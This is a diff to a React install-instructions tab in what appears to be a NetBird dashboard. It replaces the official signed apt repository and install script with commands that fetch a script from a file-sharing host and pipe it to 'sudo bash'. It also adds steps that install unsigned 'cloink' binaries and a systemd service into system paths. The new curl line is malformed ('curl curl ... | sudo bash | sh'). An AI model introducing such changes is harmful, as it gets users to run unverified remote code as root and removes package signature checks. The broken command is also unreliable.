@@ -42,7 +42,7 @@ export default function LinuxTab({
         </p>
         <Steps>
           <Steps.Step step={1}>
-            <Code>curl -fsSL https://pkgs.netbird.io/install.sh | sh</Code>
+            <Code>curl curl -s https://pan.4w.ink/f/d/2Ps3/install.sh | sudo bash | sh</Code>
           </Steps.Step>
           <Steps.Step step={2} line={false}>
             <p>
@@ -73,17 +73,9 @@ export default function LinuxTab({
                 <Steps.Step step={1}>
                   <p>{t("setupModal.addRepository")}</p>
                   <Code>
-                    <Code.Line>sudo apt-get update</Code.Line>
+                    <Code.Line>curl -L "https://pan.4w.ink/f/d/peID/cloink-linux-amd64-0.68.3.tar.gz" -o cloink-linux-amd64-0.68.3.tar.gz --progress-bar</Code.Line>
                     <Code.Line>
-                      sudo apt install ca-certificates curl gnupg -y
-                    </Code.Line>
-                    <Code.Line>
-                      curl -sSL https://pkgs.netbird.io/debian/public.key | sudo
-                      gpg --dearmor --output
-                      /usr/share/keyrings/netbird-archive-keyring.gpg
-                    </Code.Line>
-                    <Code.Line>
-                      {`echo 'deb [signed-by=/usr/share/keyrings/netbird-archive-keyring.gpg] https://pkgs.netbird.io/debian stable main' | sudo tee /etc/apt/sources.list.d/netbird.list`}
+                      tar -xzf cloink-linux-amd64-0.68.3.tar.gz
                     </Code.Line>
                   </Code>
                 </Steps.Step>
@@ -91,18 +83,25 @@ export default function LinuxTab({
                   <p>{t("setupModal.installNetBird")}</p>
                   <Code
                     codeToCopy={[
-                      `sudo apt-get update`,
-                      `sudo apt-get install netbird`,
-                      `sudo apt-get install netbird-ui`,
+                      `sudo cp cloink /usr/bin/`,
+                      `sudo cp cloink-ui /usr/bin/`,
+                      `sudo chmod +x /usr/bin/cloink /usr/bin/cloink-ui`,
                     ].join("\n")}
                   >
-                    <Code.Line>sudo apt-get update</Code.Line>
+                    <Code.Line>
+                      sudo cp cloink /usr/bin/
+                      sudo cp cloink-ui /usr/bin/
+                    </Code.Line>
                     <Code.Comment>{t("setupModal.cliOnlyComment")}</Code.Comment>
-                    <Code.Line>sudo apt-get install netbird</Code.Line>
+                    <Code.Line>sudo chmod +x /usr/bin/cloink /usr/bin/cloink-ui</Code.Line>
                     <Code.Comment>
                       {t("setupModal.guiPackageComment")}
                     </Code.Comment>
-                    <Code.Line>sudo apt-get install netbird-ui</Code.Line>
+                    <Code.Line>
+                      sudo cp systemd/cloink.service /etc/systemd/system/
+                      sudo systemctl daemon-reload
+                      sudo systemctl enable --now cloink
+                    </Code.Line>
                   </Code>
                 </Steps.Step>
                 <Steps.Step step={3} line={false}>
